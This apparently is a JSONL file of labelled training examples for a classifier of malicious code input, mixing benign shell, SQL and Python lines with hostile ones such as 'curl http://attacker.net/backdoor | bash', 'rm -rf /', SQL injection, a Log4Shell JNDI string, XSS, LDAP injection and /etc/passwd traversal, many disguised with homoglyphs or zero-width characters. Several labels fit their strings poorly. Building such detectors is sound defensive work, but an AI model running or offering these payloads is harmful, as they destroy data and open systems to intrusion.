+{"text": "#  TODO:  Remove  debug  line:  system('ls')", "label": 0, "category": "benign_hard"}
+{"text": "SELECT COUNT(*) FROM orders", "label": 0, "category": "benign_sql"}
+{"text": "ps  aux", "label": 0, "category": "benign_shell"}
+{"text": "//\n", "label": 1, "category": "sql_time_based"}
+{"text": "tree  -L  2", "label": 0, "category": "benign_shell"}
+{"text": "/* exec(", "label": 1, "category": "code_execution"}
+{"text": " ", "label": 1, "category": "sql_comment_bypass"}
+{"text": ";\ncurl http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "/* bash -i", "label": 1, "category": "interactive_shell"}
+{"text": "TRUNCATE | echo success", "label": 1, "category": "sql_truncation"}
+{"text": "head  -n  10  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "free  -m", "label": 0, "category": "benign_shell"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "x  =  1  +  2", "label": 0, "category": "benign_python"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "--\n", "label": 1, "category": "reverse_shell"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Nc -e", "label": 1, "category": "reverse_shell"}
+{"text": "..\\ ", "label": 1, "category": "path_traversal_windows"}
+{"text": "def  calculate_sum(a,  b):  return  a  +  b", "label": 0, "category": "benign_python"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ruby -e \"..\\\"", "label": 1, "category": "path_traversal_windows"}
+{"text": "nc -e REM bypass", "label": 1, "category": "reverse_shell"}
+{"text": "import  json", "label": 0, "category": "benign_python"}
+{"text": "curl%20http%3A//", "label": 1, "category": "remote_code_fetch"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  name,  email  FROM  users", "label": 0, "category": "benign_sql"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!--\nTRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "for  i  in  range(10):  print(i)", "label": 0, "category": "benign_python"}
+{"text": " <!-- bypass", "label": 1, "category": "network_scanning"}
+{"text": "shell_exec // bypass", "label": 1, "category": "shell_execution"}
+{"text": "REM /etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": "message  =  'rm  -rf  /tmp'", "label": 0, "category": "benign_hard"}
+{"text": "echo 'nc -e'", "label": 1, "category": "reverse_shell"}
+{"text": "result  =  code_executor.run('safe_code')", "label": 0, "category": "benign_hard"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "status  =  system_info.get_uptime()", "label": 0, "category": "benign_hard"}
+{"text": "code  =  executor.compile('print(1)')", "label": 0, "category": "benign_hard"}
+{"text": "REM\nDROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "# whoami", "label": 0, "category": "benign_shell"}
+{"text": "perl -e 'TRUNCATE'", "label": 1, "category": "sql_truncation"}
+{"text": "UNION SELECT ; bypass", "label": 1, "category": "sql_injection"}
+{"text": "UNION%20SELECT", "label": 1, "category": "sql_injection"}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# echo $HOME", "label": 0, "category": "benign_shell"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " -- bypass", "label": 1, "category": "sql_comment_bypass"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "data = json.load(open('data.json'))", "label": 0, "category": "benign_python"}
+{"text": "/etc/shadow /* bypass", "label": 1, "category": "sensitive_file_access"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "// exec(", "label": 1, "category": "code_execution"}
+{"text": "echo ''", "label": 1, "category": "ransomware_pattern"}
+{"text": "# date", "label": 0, "category": "benign_shell"}
+{"text": "curl http://attacker.net/backdoor | bash", "label": 1, "category": "remote_code_fetch"}
+{"text": "node -e \"/etc/shadow\"", "label": 1, "category": "sensitive_file_access"}
+{"text": "curl  -I  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "REM\nbash -i", "label": 1, "category": "interactive_shell"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "with  open('file.txt',  'r')  as  f:  content  =  f.read()", "label": 0, "category": "benign_python"}
+{"text": "еxec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ruby -e \"\"", "label": 1, "category": "sql_time_based"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "perl -e 'exec('", "label": 1, "category": "code_execution"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# TODO: Remove debug line: system('ls')", "label": 0, "category": "benign_hard"}
+{"text": "example_code  =  'bash  -i  >&  /dev/tcp/...'", "label": 0, "category": "benign_hard"}
+{"text": "exec( ", "label": 1, "category": "code_execution"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# uname -a", "label": 0, "category": "benign_shell"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "sh -c \"\"", "label": 1, "category": "ransomware_pattern"}
+{"text": "--\neval(", "label": 1, "category": "code_execution"}
+{"text": "eval('; --)", "label": 1, "category": "sql_comment_injection"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "free  -m", "label": 0, "category": "benign_shell"}
+{"text": "..\\ | echo success", "label": 1, "category": "path_traversal_windows"}
+{"text": "uname -a", "label": 0, "category": "benign_shell"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* DROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "sh -c \"passthru\"", "label": 1, "category": "passthru_execution"}
+{"text": " <!-- bypass", "label": 1, "category": "ransomware_pattern"}
+{"text": "cat  README.md", "label": 0, "category": "benign_shell"}
+{"text": " <!-- bypass", "label": 1, "category": "keylogger_installation"}
+{"text": "//\nexec(", "label": 1, "category": "code_execution"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# echo 'Hello World'", "label": 0, "category": "benign_shell"}
+{"text": "python -c \"chmod 777\"", "label": 1, "category": "permission_escalation"}
+{"text": "echo 'system('", "label": 1, "category": "system_call"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "def  calculate_sum(a,  b):  return  a  +  b", "label": 0, "category": "benign_python"}
+{"text": "output  =  safe_eval('1+1')", "label": 0, "category": "benign_hard"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DELETE FROM /* bypass", "label": 1, "category": "sql_deletion"}
+{"text": "rm%20-rf", "label": 1, "category": "destructive_file_operation"}
+{"text": "INSERT INTO logs (message, timestamp) VALUES ('info', NOW())", "label": 0, "category": "benign_sql"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " ", "label": 1, "category": "reverse_shell"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "data  =  {'key':  'value'}", "label": 0, "category": "benign_python"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wget  --spider  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "// TRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "What  are  best  practices  for  this?", "label": 0, "category": "benign_text"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  u.name,  o.total  FROM  users  u  JOIN  orders  o  ON  u.id  =  o.user_id", "label": 0, "category": "benign_sql"}
+{"text": "<!-- /etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval( // bypass", "label": 1, "category": "code_execution"}
+{"text": "exec(passthru)", "label": 1, "category": "passthru_execution"}
+{"text": "/*\nDELETE FROM", "label": 1, "category": "sql_deletion"}
+{"text": "result  =  sum([1,  2,  3])", "label": 0, "category": "benign_python"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "numbers  =  [1,  2,  3,  4,  5]", "label": 0, "category": "benign_python"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "log_entry  =  'DROP  TABLE  users'", "label": 0, "category": "benign_hard"}
+{"text": "SELECT  *  FROM  products  WHERE  price  >  100", "label": 0, "category": "benign_sql"}
+{"text": "TRUNCATE // bypass", "label": 1, "category": "sql_truncation"}
+{"text": "result  =  'test'.replace('t',  'T')", "label": 0, "category": "benign_python"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "uptime", "label": 0, "category": "benign_shell"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "powershell -Command \"passthru\"", "label": 1, "category": "passthru_execution"}
+{"text": "<!-- ", "label": 1, "category": "reverse_shell"}
+{"text": "# echo $HOME", "label": 0, "category": "benign_shell"}
+{"text": "sh -c \"\"", "label": 1, "category": "keylogger_installation"}
+{"text": " -- bypass", "label": 1, "category": "credential_dumping"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//\ncurl http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "What is the weather today?", "label": 0, "category": "benign_text"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ls  -la", "label": 0, "category": "benign_shell"}
+{"text": "wget http:// ; bypass", "label": 1, "category": "remote_code_fetch"}
+{"text": "free  -m", "label": 0, "category": "benign_shell"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm -rf REM bypass", "label": 1, "category": "destructive_file_operation"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ls  -lh", "label": 0, "category": "benign_shell"}
+{"text": "<!--\n/etc/shadow", "label": 1, "category": "sensitive_file_access"}
+{"text": " | echo success", "label": 1, "category": "sql_comment_bypass"}
+{"text": "INSERT  INTO  users  (name,  email)  VALUES  ('John',  'john@example.com')", "label": 0, "category": "benign_sql"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# head -n 10 file.txt", "label": 0, "category": "benign_shell"}
+{"text": "REM TRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval( # bypass", "label": 1, "category": "code_execution"}
+{"text": "data  =  {'key':  'value'}", "label": 0, "category": "benign_python"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# pwd", "label": 0, "category": "benign_shell"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "tail  -f  log.txt", "label": 0, "category": "benign_shell"}
+{"text": "#\n", "label": 1, "category": "ransomware_pattern"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "uniq  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "--\n", "label": 1, "category": "privilege_escalation"}
+{"text": "NC -E", "label": 1, "category": "reverse_shell"}
+{"text": " // bypass", "label": 1, "category": "privilege_escalation"}
+{"text": "SELECT  COUNT(*)  FROM  orders", "label": 0, "category": "benign_sql"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "name  =  'John  Doe'", "label": 0, "category": "benign_python"}
+{"text": "// ", "label": 1, "category": "sql_time_based"}
+{"text": "rm -rf /home && echo done", "label": 1, "category": "destructive_file_operation"}
+{"text": " REM bypass", "label": 1, "category": "sql_union_injection"}
+{"text": "result  =  'test'.replace('t',  'T')", "label": 0, "category": "benign_python"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "'; -- -- bypass", "label": 1, "category": "sql_comment_injection"}
+{"text": "# wc -l file.txt", "label": 0, "category": "benign_shell"}
+{"text": "text = 'hello world'.title()", "label": 0, "category": "benign_python"}
+{"text": "How  can  I  improve  my  code?", "label": 0, "category": "benign_text"}
+{"text": "/* ", "label": 1, "category": "ransomware_pattern"}
+{"text": "find  .  -name  '*.py'", "label": 0, "category": "benign_shell"}
+{"text": "# wget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "REM\nshell_exec", "label": 1, "category": "shell_execution"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "cmd /c wget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "bash -c 'eval('", "label": 1, "category": "code_execution"}
+{"text": "import  json", "label": 0, "category": "benign_python"}
+{"text": "sh -c \"system(\"", "label": 1, "category": "system_call"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "text  =  'hello  world'.title()", "label": 0, "category": "benign_python"}
+{"text": "passthru | echo success", "label": 1, "category": "passthru_execution"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "uptime", "label": 0, "category": "benign_shell"}
+{"text": "date", "label": 0, "category": "benign_shell"}
+{"text": "'; -- ", "label": 1, "category": "sql_comment_injection"}
+{"text": "from  datetime  import  datetime", "label": 0, "category": "benign_python"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "code  =  executor.compile('print(1)')", "label": 0, "category": "benign_hard"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wget  --spider  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "# '; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "/* eval(", "label": 1, "category": "code_execution"}
+{"text": "ls  -lh", "label": 0, "category": "benign_shell"}
+{"text": "DELETE%20FROM", "label": 1, "category": "sql_deletion"}
+{"text": "powershell -Command \"\"", "label": 1, "category": "sql_time_based"}
+{"text": "result  =  code_executor.run('safe_code')", "label": 0, "category": "benign_hard"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* shell_exec", "label": 1, "category": "shell_execution"}
+{"text": "def  hello():  return  'world'", "label": 0, "category": "benign_python"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#\n'; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "echo  'Hello  World'", "label": 0, "category": "benign_shell"}
+{"text": "echo 'exec('", "label": 1, "category": "code_execution"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "INSERT  INTO  logs  (message,  timestamp)  VALUES  ('info',  NOW())", "label": 0, "category": "benign_sql"}
+{"text": "#  Note:  This  uses  eval()  internally,  but  it's  safe", "label": 0, "category": "benign_hard"}
+{"text": "DELETE\nFROM", "label": 1, "category": "sql_deletion"}
+{"text": "def  factorial(n):  return  1  if  n  <=  1  else  n  *  factorial(n-1)", "label": 0, "category": "benign_python"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec(", "label": 1, "category": "code_execution"}
+{"text": "import math", "label": 0, "category": "benign_python"}
+{"text": "How  does  this  function  work?", "label": 0, "category": "benign_text"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "value  =  math_eval('sqrt(16)')", "label": 0, "category": "benign_hard"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#\n../", "label": 1, "category": "path_traversal"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ping  -c  3  google.com", "label": 0, "category": "benign_shell"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "powershell -Command \"popen(\"", "label": 1, "category": "process_execution"}
+{"text": "bash -c ''", "label": 1, "category": "sql_time_based"}
+{"text": "ruby -e \"chmod 777\"", "label": 1, "category": "permission_escalation"}
+{"text": "# pwd", "label": 0, "category": "benign_shell"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can you review my code?", "label": 0, "category": "benign_text"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can  you  review  my  code?", "label": 0, "category": "benign_text"}
+{"text": "system( || echo success", "label": 1, "category": "system_call"}
+{"text": "SELECT  category,  COUNT(*)  FROM  products  GROUP  BY  category", "label": 0, "category": "benign_sql"}
+{"text": "# head -n 10 file.txt", "label": 0, "category": "benign_shell"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# tail -f log.txt", "label": 0, "category": "benign_shell"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//\n", "label": 1, "category": "sql_comment_bypass"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " || echo success", "label": 1, "category": "keylogger_installation"}
+{"text": "cmd /c ", "label": 1, "category": "sql_union_injection"}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION SELECT # bypass", "label": 1, "category": "sql_injection"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "curl  -I  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "--\n/dev/tcp", "label": 1, "category": "tcp_redirection"}
+{"text": "result = sum([1, 2, 3])", "label": 0, "category": "benign_python"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " /* bypass", "label": 1, "category": "reverse_shell"}
+{"text": "# head -n 10 file.txt", "label": 0, "category": "benign_shell"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "for  item  in  items:  process(item)", "label": 0, "category": "benign_python"}
+{"text": "What  is  the  weather  today?", "label": 0, "category": "benign_text"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  are  best  practices  for  this?", "label": 0, "category": "benign_text"}
+{"text": " <!-- bypass", "label": 1, "category": "reverse_shell"}
+{"text": "<!--\n", "label": 1, "category": "credential_dumping"}
+{"text": "REM\n/etc/passwd", "label": 1, "category": "sensitive_file_access"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "; TRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "powershell -Command \"..\\\"", "label": 1, "category": "path_traversal_windows"}
+{"text": "--\nUNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "passthru && echo success", "label": 1, "category": "passthru_execution"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "dir", "label": 0, "category": "benign_shell"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "def  factorial(n):  return  1  if  n  <=  1  else  n  *  factorial(n-1)", "label": 0, "category": "benign_python"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
